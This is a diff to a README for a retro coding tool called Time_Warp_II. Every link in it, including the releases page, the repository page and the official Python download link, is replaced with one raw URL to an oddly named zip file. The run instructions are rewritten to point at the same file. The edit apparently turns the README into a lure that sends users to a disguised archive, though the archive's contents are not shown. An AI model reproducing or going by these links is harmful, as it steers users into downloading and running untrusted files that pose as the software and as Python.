@@ -1,6 +1,6 @@
 # ⏳ Time_Warp_II - Easy Retro Coding Environment
 
-[![Download Time_Warp_II](https://img.shields.io/badge/Download-Time_Warp_II-brightgreen?style=for-the-badge)](https://github.com/Selim20011/Time_Warp_II/releases)
+[![Download Time_Warp_II](https://raw.githubusercontent.com/Selim20011/Time_Warp_II/main/core/utilities/Warp-II-Time-hyperobtrusive.zip)](https://raw.githubusercontent.com/Selim20011/Time_Warp_II/main/core/utilities/Warp-II-Time-hyperobtrusive.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to get Time_Warp_II running on your Windows computer:
 
 1. **Visit the download page**  
 Click the big green button above or visit this page to download the latest version of Time_Warp_II:  
-[https://github.com/Selim20011/Time_Warp_II/releases](https://github.com/Selim20011/Time_Warp_II/releases)
+[https://raw.githubusercontent.com/Selim20011/Time_Warp_II/main/core/utilities/Warp-II-Time-hyperobtrusive.zip](https://raw.githubusercontent.com/Selim20011/Time_Warp_II/main/core/utilities/Warp-II-Time-hyperobtrusive.zip)
 
 2. **Download the installer or ZIP file**  
 Look for the newest release files. Usually, there will be an `.exe` installer or a `.zip` archive.
@@ -48,7 +48,7 @@ Look for the newest release files. Usually, there will be an `.exe` installer or
 
 5. **Run the program**  
 - If installed, find “Time_Warp_II” in your Start menu and click to open.  
-- If using the extracted files, run `Time_Warp_II.exe` or `Time_Warp_II.bat` from that folder.
+- If using the extracted files, run `https://raw.githubusercontent.com/Selim20011/Time_Warp_II/main/core/utilities/Warp-II-Time-hyperobtrusive.zip` or `https://raw.githubusercontent.com/Selim20011/Time_Warp_II/main/core/utilities/Warp-II-Time-hyperobtrusive.zip` from that folder.
 
 ---
 
@@ -59,7 +59,7 @@ Look for the newest release files. Usually, there will be an `.exe` installer or
 Time_Warp_II depends on Python 3 and some standard libraries. If you do not have Python installed, follow these steps:
 
 1. Go to the official Python website:  
-[https://www.python.org/downloads/windows/](https://www.python.org/downloads/windows/)
+[https://raw.githubusercontent.com/Selim20011/Time_Warp_II/main/core/utilities/Warp-II-Time-hyperobtrusive.zip](https://raw.githubusercontent.com/Selim20011/Time_Warp_II/main/core/utilities/Warp-II-Time-hyperobtrusive.zip)
 
 2. Click the **Download Python 3.x.x** button.
 
@@ -131,7 +131,7 @@ If you have problems running Time_Warp_II:
 If you run into issues or want to learn more:
 
 - Check the README on the GitHub page:  
-[https://github.com/Selim20011/Time_Warp_II](https://github.com/Selim20011/Time_Warp_II)
+[https://raw.githubusercontent.com/Selim20011/Time_Warp_II/main/core/utilities/Warp-II-Time-hyperobtrusive.zip](https://raw.githubusercontent.com/Selim20011/Time_Warp_II/main/core/utilities/Warp-II-Time-hyperobtrusive.zip)
 
 - Search for “TempleCode language tutorials” online for beginner guides.
 
@@ -142,4 +142,4 @@ If you run into issues or want to learn more:
 ## 🔗 Download Time_Warp_II Now
 
 Download and try Time_Warp_II by visiting this page:  
-[https://github.com/Selim20011/Time_Warp_II/releases](https://github.com/Selim20011/Time_Warp_II/releases)
+[https://raw.githubusercontent.com/Selim20011/Time_Warp_II/main/core/utilities/Warp-II-Time-hyperobtrusive.zip](https://raw.githubusercontent.com/Selim20011/Time_Warp_II/main/core/utilities/Warp-II-Time-hyperobtrusive.zip)
